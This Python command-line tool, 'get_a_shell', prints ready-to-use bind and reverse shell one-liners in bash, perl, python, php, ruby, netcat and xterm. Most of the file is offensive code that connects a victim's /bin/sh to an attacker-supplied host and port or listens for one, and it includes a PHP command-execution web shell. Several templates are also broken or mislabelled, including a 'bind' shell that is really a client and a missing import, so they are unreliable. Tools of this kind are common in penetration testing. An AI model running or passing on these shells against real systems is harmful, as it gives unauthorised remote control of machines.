#!/usr/bin/env python
# -*- coding: utf8 -*-
"""
 ######   ######## ########       ###        ######  ##     ## ######## ##       ##
##    ##  ##          ##         ## ##      ##    ## ##     ## ##       ##       ##
##        ##          ##        ##   ##     ##       ##     ## ##       ##       ##
##   #### ######      ##       ##     ##     ######  ######### ######   ##       ##
##    ##  ##          ##       #########          ## ##     ## ##       ##       ##
##    ##  ##          ##       ##     ##    ##    ## ##     ## ##       ##       ##
 ######   ########    ##       ##     ##     ######  ##     ## ######## ######## ########





"""
__author__ = "Emilien Peretti"
__version__ = "1.1"
__doc__ = """  Get a shell code (bind/reverse) into different languages                                         
"""
__examples__ = ["get_a_shell bind python --rport 10",
                "get_a_shell reverse ruby --lhost 10.10.10.10 --lport 20"]
import argparse
import sys


def perl_bind_shell(rport):
    """
    Bind shell in perl
    :param rport: the remote port
    :return:
    """
    assert rport is not None
    return """perl -e 'use Socket;$p={}""".format(rport) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
                                                           "bind(S,sockaddr_in($p,INADDR_ANY));listen(S, SOMAXCONN);" \
                                                           "for(; $p= accept(C, S); close C) {open(STDIN,\">&C\");" \
                                                           "open(STDOUT,\">&C\");open(STDERR," \
                                                           "\">&C\");exec(\"/bin/sh -i\");};'"


def python_bind_shell(rport):
    """
        Bind shell in python
        :param rport: the remote port
        :return:
        """
    assert rport is not None
    return "python -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); " \
           "s.bind(('', {}));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0)," \
           "os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(rport)


def php_bind_shell(rport):
    """
        Bind shell in php
        :param rport: the remote port
        :return:
        """
    assert rport is not None
    return "<?php echo exec($_POST['cmd']); ?>"


def ruby_bind_shell(rport):
    """
        Bind shell in ruby
        :param rport: the remote port
        :return:
        """
    assert rport is not None
    return "ruby -rsocket -e's=TCPSocket.new(\"VictimIP\",4444);loop do;cmd=gets.chomp;s.puts cmd;" \
           "s.close if cmd==\"exit\";puts s.recv(1000000);end'".format(rport)


def netcat_bind_shell(rport):
    """
        Bind shell in netcat
        :param rport: the remote port
        :return:
        """
    assert rport is not None
    return "nc -lvp {} –e /bin/bash".format(rport)


def perl_reverse_shell(lhost, lport):
    """
    Reverse shell in perl
    :param lhost: the local host ip address
    :param lport: the local port
    :return:
    """
    assert lhost is not None
    assert lport is not None
    return """perl -e 'use Socket;$i="{}";$p={};""".format(lhost, lport) \
           + "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
             "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");" \
             "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"


def python_reverse_shell(lhost, lport):
    """
        Reverse shell in python
        :param lhost: the local host ip address
        :param lport: the local port
        :return:
        """
    assert lhost is not None
    assert lport is not None
    return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" \
           "s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);" \
           "p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(lhost, lport)


def php_reverse_shell(lhost, lport):
    """
        Reverse shell in php
        :param lhost: the local host ip address
        :param lport: the local port
        :return:
        """
    assert lhost is not None
    assert lport is not None
    return """php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""".format(lhost, lport)


def ruby_reverse_shell(lhost, lport):
    """
        Reverse shell in ruby
        :param lhost: the local host ip address
        :param lport: the local port
        :return:
        """
    assert lhost is not None
    assert lport is not None
    return "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;" \
           "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(lhost, lport)


def netcat_reverse_shell(lhost, lport):
    """
        Reverse shell in netcat
        :param lhost: the local host ip address
        :param lport: the local port
        :return:
        """
    assert lhost is not None
    assert lport is not None
    return """nc -e /bin/sh {} {}""".format(lhost, lport)


def xterm_reverse_shell(lhost, lport):
    """
        Reverse shell in xterm
        :param lhost: the local host ip address
        :param lport: the local port
        :return:
        """
    assert lhost is not None
    assert lport is not None
    return """xterm -display {}:{}""".format(lhost, lport)


def bash_reverse_shell(lhost, lport):
    """
        Reverse shell in bash
        :param lhost: the local host ip address
        :param lport: the local port
        :return:
        """
    assert lhost is not None
    assert lport is not None
    return "bash -i >& /dev/tcp/{}/{} 0>&1".format(lhost, lport)


shells = {
    "bash": {
        "bind": None,
        "reverse": bash_reverse_shell
    },
    "perl": {
        "bind": perl_bind_shell,
        "reverse": perl_reverse_shell
    },
    "python": {
        "bind": python_bind_shell,
        "reverse": python_reverse_shell
    },
    "ruby": {
        "bind": ruby_bind_shell,
        "reverse": ruby_reverse_shell
    },
    "netcat": {
        "bind": netcat_bind_shell,
        "reverse": netcat_reverse_shell
    },
    "php": {
        "bind": php_bind_shell,
        "reverse": php_reverse_shell
    },
    "xterm": {
        "bind": None,
        "reverse": xterm_reverse_shell
    },
}


def main_with_params(type, language, lhost=None, lport=None, rhost=None, rport=None):
    """
    Aims to call the script inside an other script
    :param type: the type of shell (bind/reverse)
    :param language: the language of shell
    :param lhost: the local host ip adress
    :param lport: the local port
    :param rhost: the remote host ip address
    :param rport: the remote port
    :return:
    """
    if language in shells:
        if type in shells[language] and shells[language][type] is not None:
            if type == "bind":
                return shells[language][type](rport)
            if type == "reverse":
                return shells[language][type](lhost, lport)


def main_with_args(*args, **kwargs):
    """
        Aims to transform the script into a consol script
        :param args: sys args
        :param kwargs: sys kwargs
        :return:
        """
    print("######   ######## ########       ###        ######  ##     ## ######## ##       ##      ")
    print("##    ##  ##          ##         ## ##      ##    ## ##     ## ##       ##       ##     ")
    print("##        ##          ##        ##   ##     ##       ##     ## ##       ##       ##     ")
    print("##   #### ######      ##       ##     ##     ######  ######### ######   ##       ##     ")
    print("##    ##  ##          ##       #########          ## ##     ## ##       ##       ##     ")
    print("##    ##  ##          ##       ##     ##    ##    ## ##     ## ##       ##       ##     ")
    print("######   ########    ##       ##     ##     ######  ##     ## ######## ######## ########")
    print
    print
    parser = argparse.ArgumentParser()
    parser.add_argument("type", help="The type of shell (bind or reverse)")
    parser.add_argument("language", help="The language of the shell")
    parser.add_argument('--rhost', help='The remote ip address', dest="rhost", default=None)
    parser.add_argument('--rport', help='The remote port', dest="rport", default=None)
    parser.add_argument('--lhost', help='The local ip address', dest="lhost", default=None)
    parser.add_argument('--lport', help='The local port', dest="lport", default=None)
    args = parser.parse_args()
    print "----------------------------------------- SHELL --------------------------------------------------"
    print main_with_params(type=args.type,
                           language=args.language,
                           rhost=args.rhost,
                           rport=args.rport,
                           lhost=args.lhost,
                           lport=args.lport
                           )
    print "-------------------------------------------------------------------------------------------------"


# ---------------------------------------  Main ------------------------------------------------------------------------
if __name__ == "__main__":
    # Arguments
    main_with_args(sys.argv)
